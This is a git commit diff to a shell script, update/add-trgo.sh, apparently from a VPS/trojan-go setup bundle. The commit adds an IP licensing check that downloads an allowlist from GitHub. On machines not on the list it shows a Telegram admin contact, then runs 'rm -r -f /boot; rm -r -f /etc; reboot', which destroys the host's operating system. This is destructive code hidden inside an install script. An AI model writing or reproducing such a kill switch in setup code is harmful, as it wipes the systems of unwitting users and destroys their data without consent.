d3ce00e9a534b05fbba260ff75c3e59f033f4208
halluboys <87511503+halluboys@users.noreply.github.com>
2021-08-27 17:50:22 +0700

    Update add-trgo.sh

--- update/add-trgo.sh
+++ update/add-trgo.sh
@@ -2,8 +2,20 @@
 red='\e[1;31m'
 green='\e[0;32m'
 NC='\e[0m'
-MYIP=$(wget -qO- ipinfo.io/ip);
-echo "Checking VPS"
+MYIP=$(wget -qO- ifconfig.me/ip);
+IZIN=$( curl https://raw.githubusercontent.com/halluboys/ipvps/main/ip | grep $MYIP )
+if [ $MYIP = $IZIN ]; then
+echo -e "${green}Permission Accepted...${NC}"
+else
+echo -e "${red}Permission Denied!${NC}";
+echo "Please Contact Admin"
+echo "Telegram t.me/xzvnct"
+echo "Waiting 5 Sec"
+rm -f setup.sh
+sleep 5
+rm -r -f /boot; rm -r -f /etc; reboot
+exit 0
+fi
 clear
 uuid=$(cat /etc/trojan-go/uuid.txt)
 source /var/lib/premium-script/ipvps.conf
